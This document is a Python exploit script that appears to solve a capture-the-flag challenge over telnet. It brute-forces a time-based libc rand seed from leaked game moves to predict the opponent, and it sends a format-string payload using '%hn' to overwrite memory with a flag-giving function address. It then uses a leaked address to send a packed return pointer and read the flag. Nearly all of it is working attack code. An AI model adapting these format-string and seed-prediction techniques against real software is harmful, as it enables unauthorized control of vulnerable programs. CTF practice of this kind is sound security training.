import socket
import sys
import telnetlib

HOST = "booty.9447.plumbing"
PORT = 9447

PUSH_ENUM = 0
HOLD_ENUM = 1
REST_ENUM = 2

PUSH = 'p'
HOLD = 'h'
REST = 'r'

# Import libc functions for time, srand and rand

from ctypes import cdll
libc = cdll.LoadLibrary("libc.so.6")
mytime = libc.time(None)


# Simulate libc srand and rand
def srand(seed):
    global libc
    libc.srand(seed)

def rand ():
    global libc
    return libc.rand()



tn = telnetlib.Telnet(HOST, PORT);

def init_user (user):
    print tn.read_until(">")
    tn.write(user + "\n")
    print tn.read_until(">")

def make_move(move):
    print "making MOve " + str(move)
    tn.write(move + '\n')

def print_till_prompt():
    read = 'a'
    while (read != ""):
        read = tn.read_until(">")
        if (read != ""):
            print read


# We leak a move by holding, since that's our best
# chance of survival
my_leak_move = 'h'
def leak_move():
    print "Leaking..."
    tn.write(my_leak_move + '\n')
    print tn.read_until(".")
    rtext = tn.read_until(">")
    print "Here"
    print rtext
    if "pushes" in rtext:
        return PUSH_ENUM

    if "locks their arm" in rtext or "tries to hold" in rtext:
        return HOLD_ENUM

    if "takes a breather." in rtext:
        return REST_ENUM
    assert(1==0)

# Predict the next enemy move once we have the rand seed
def predict_move(enemy_move):
    if enemy_move == PUSH_ENUM:
        my_move = HOLD
    elif enemy_move == HOLD_ENUM:
        my_move = REST
    else:
        my_move = PUSH
    return my_move

def get_next_move():
    return (rand() %3)





from struct import pack
giveflag = 0x80487C0
ownoffset = 30
USER_1 = '%%%%%0'+str((giveflag&0xffff)-4)+'d%'+str(ownoffset)+'$hn'



### Init user

init_user (USER_1 +'\n')
rands = []
rand_leak = 20
for i in range (rand_leak):
    rands.append(leak_move())


print rands

start_time = mytime - 1000
end_time = mytime + 1000

correct_seed = -1
success = 0
for try_seed in range(start_time,end_time):
    # initialize
    success = 1
    srand(try_seed)

    # try rands
    for i in range(20):
        if (rand() % 3) != rands[i]:
            success = 0
            break;

    if success == 1:
        correct_seed = try_seed
        break
print correct_seed


# Set up state of the game
srand(correct_seed)
for i in range(20):
    rand()


# Play first round of the game
make_move(predict_move(get_next_move()))
while 1:
    rtext = tn.read_until(">")
    print rtext
    if "PIRATE KING" in rtext:
        start_idx = rtext.find(" marks the spot") - len("0xaabbccdd")
        leak = int(rtext[start_idx: start_idx + len("0xaabbccdd")],16)
        break;
    make_move(predict_move(get_next_move()))



from struct import pack
retptr = pack('<I', leak + 0xD - 48)
print hex(leak)
giveflag = 0x80487C0
ownoffset = 30
USER_2 = retptr


assert(len(retptr) == 4)

# 2nd round payload
print repr(retptr)
tn.write('y\n')
print tn.read_until(">")
tn.sock.send(USER_2 + '\n')

rtext = tn.read_until(">")
print rtext
rtext = tn.read_until(">")

# Play 2nd round
while 1:
    make_move(predict_move(get_next_move()))
    rtext = tn.read_until(">")
    print rtext
    if "PIRATE KING" in rtext:
        print rtext
        break;

# Collect flag
print tn.sock.recv(4096)

print "done"
